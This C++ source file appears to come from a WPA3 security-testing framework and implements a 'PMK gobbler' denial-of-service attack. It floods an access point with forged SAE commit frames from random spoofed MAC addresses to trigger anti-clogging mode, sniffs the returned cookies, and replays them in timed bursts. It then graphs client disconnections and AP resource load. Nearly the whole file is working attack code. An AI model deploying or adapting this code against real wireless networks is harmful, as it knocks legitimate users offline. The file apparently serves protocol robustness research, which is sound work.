#include "attacks/DoS_hard/PMK_gobbler/pmk_gobbler.h"

#include <chrono>
#include <thread>
#include <utility>
#include <tins/tins.h>

#include "inteprrupt.h"
#include "attacks/components/sniffer_helper.h"
#include "attacks/DoS_hard/cookie_guzzler/capture_commit_values.h"
#include "ex_program/external_actors/ExternalConn.h"
#include "logger/log.h"
#include "observer/resource_checker.h"
#include "observer/station_counter.h"
#include "system/hw_capabilities.h"
#include "system/firmware/ath9k_htc.h"

using namespace std;
using namespace Tins;
using namespace chrono;

namespace wpa3_tester::pmk_gobbler{
optional<ACMCookie> parse_acm_response(const vector<uint8_t> &packet){
	const auto sae = dos_helpers::parse_sae_commit(packet);
	if(!sae || sae->token.empty()) return nullopt;

	const uint16_t radiotap_len = *reinterpret_cast<const uint16_t *>(packet.data() + 2);
	if(packet.size() < static_cast<size_t>(radiotap_len + 10)) return nullopt;

	return ACMCookie{
		.sta_mac = HWAddress<6>(packet.data() + radiotap_len + 4),
		.token   = sae->token
	};
}

void capture_cookies(const string &sniff_iface, const HWAddress<6> &ap_mac, CookieStore &store){
	const string filter = "wlan type mgt subtype auth and wlan addr2 " + ap_mac.to_string();

	components::poll_sniffer_pdu<monostate>(
		[&](const PDU &pdu) -> optional<monostate> {
			if(store.stop.load()) return monostate{};

			const auto *raw_pdu = pdu.find_pdu<RawPDU>();
			if(!raw_pdu) return nullopt;

			if(auto entry = parse_acm_response(raw_pdu->payload())){
				lock_guard lock(store.mtx);
				const auto [it, inserted] = store.queue.insert_or_assign(
					entry->sta_mac.to_string(), *entry);
				if(inserted)
					log(LogLevel::DEBUG, "Cookie captured for {}, queue size {}",
						entry->sta_mac.to_string(), store.queue.size());
			}
			return nullopt;
		},
		sniff_iface, filter, nullopt
	);

	log(LogLevel::INFO, "Cookie capture stopped");
}

pair<ACMCookie, int> trigger_acm(const string &iface, const string &att_mac, const HWAddress<6> &ap_mac,
								  const int trigger_count, const dos_helpers::SAEPair &sae_params){
	PacketSender sender(iface);

	SnifferConfiguration cfg;
	cfg.set_immediate_mode(true);
	cfg.set_filter("wlan type mgt subtype auth");
	Sniffer sniffer(iface, cfg);

	log(LogLevel::INFO, "Triggering ACM (max {} frames)...", trigger_count);

	for(int i = 0; i < trigger_count; ++i){
		auto frame = make_sae_commit(ap_mac,
			HWAddress<6>(firmware::get_random_ath_masker_mac(att_mac)), sae_params);
		sender.send(frame);

		auto result = components::poll_sniffer<ACMCookie>(
			sniffer.get_pcap_handle(), milliseconds(5),
			[&](const uint8_t *packet, const uint32_t caplen) -> optional<ACMCookie> {
				if(auto cookie = parse_acm_response({packet, packet + caplen})){
					if(!cookie->token.empty()) return cookie;
				}
				return nullopt;
			}
		);

		if(holds_alternative<ACMCookie>(result)){
			log(LogLevel::INFO, "ACM confirmed active after {} frames", i);
			return {get<ACMCookie>(result), i};
		}
	}
	throw run_err("ACM not activated after " + to_string(trigger_count) + " frames");
}


void burst_with_cookies(const string &iface, const string &sta_mac, const HWAddress<6> &ap_mac, CookieStore &store,
						const int attack_time_sec, const dos_helpers::SAEPair &sae_params
){
	PacketSender sender(iface);
	// TODO get from config
	constexpr size_t burst_size = 128;
	constexpr size_t packets_per_second_limit = 500;

	log(LogLevel::INFO, "Burst phase started, duration: {}s", attack_time_sec);
	dos_helpers::timed_burst(sender, attack_time_sec, burst_size, packets_per_second_limit,
	[&]() -> optional<RadioTap>{
		optional<ACMCookie> entry;
		{
			lock_guard lock(store.mtx);
			if(!store.queue.empty()){
				const auto it = store.queue.begin();
				entry = std::move(it->second);
				store.queue.erase(it);
			}
		}

		if(!entry){
			this_thread::sleep_for(milliseconds(50)); //TODO hardcoded
			auto frame = make_sae_commit(ap_mac, HWAddress<6>(firmware::get_random_ath_masker_mac(sta_mac)), sae_params);
			sender.send(frame);
			return nullopt;
		}

		auto burst_params = sae_params;
		burst_params.token = entry->token;
		return optional{make_sae_commit(ap_mac, entry->sta_mac, burst_params)};
	});
	store.stop.store(true); // signal capture thread to exit
}

void run_attack(RunStatus &rs){
	const ActorPtr ap = rs.get_actor("access_point");
	const ActorPtr attacker = rs.get_actor("attacker");

	const HWAddress<6> ap_mac(ap["mac"]);
	const string iface = attacker["iface"];
	const string sniff_iface = attacker["sniff_iface"];

	const auto &att_cfg = rs.config.at("attack_config");
	const int trigger_count = att_cfg.at("acm_trigger_count").get<int>();
	const int attack_time = att_cfg.at("attack_time_sec").get<int>();

	const auto ssid = rs.config.at("actors").at("access_point").at("setup").at("program_config").at("ssid").get<
		string>();
	const optional<dos_helpers::SAEPair> sae_params = cookie_guzzler::get_commit_values(
		rs, attacker["iface"], attacker["sniff_iface"], ssid, ap["mac"], 30);
	attacker->set_monitor_mode();
	attacker->set_iface_up();

	//  force AP into ACM mode
	trigger_acm(iface, attacker["mac"], ap_mac, trigger_count, sae_params.value());
	rs.start_observers();
	CookieStore store;
	thread capture_thread([&](){
		try{
			capture_cookies(sniff_iface, ap_mac, store);
		} catch(const exception &e){
			log(LogLevel::ERROR, "Capture thread: " + string(e.what()));
			store.stop.store(true);
		}
	});

	try{
		burst_with_cookies(iface, attacker["mac"], ap_mac, store, attack_time, sae_params.value());
	} catch(...){
		store.stop.store(true);
		if(capture_thread.joinable()) capture_thread.join();
		throw;
	}

	if(capture_thread.joinable()) capture_thread.join();
	ap->conn->disconnect();
}

void stats_attack(const RunStatus &rs){
	const auto ap = rs.config.at("actors").at("access_point");

	vector<unique_ptr<GraphElements>> elements;
	rs.log_events(elements, {
					{"access_point", "did not acknowledge", "ACK_fail", "red"},
					{"client", "CTRL-EVENT-DISCONNECTED", "DISCONN", "red"},
					{"access_point", "EAPOL-4WAY-HS-COMPLETED", "4Way", "green"},
					{"client", "@START", "START", "black"}, {"client", "@END", "END", "black"},
				});

	//elements.push_back(make_unique<EventLines>(
	//    observer::tshark::get_tshark_events(rs, "attacker", "wlan.fc.type == 0  && wlan.fc.subtype == 11", "AUTH"), "AUTH", "red"));
	observer::station_counter::create_station_graph(rs, "access_point", elements);
	observer::resource_checker::create_graph(rs, ap["source"], elements);
	//observer::tshark::generate_time_series_retry_graph(rs, "attacker");
}
}
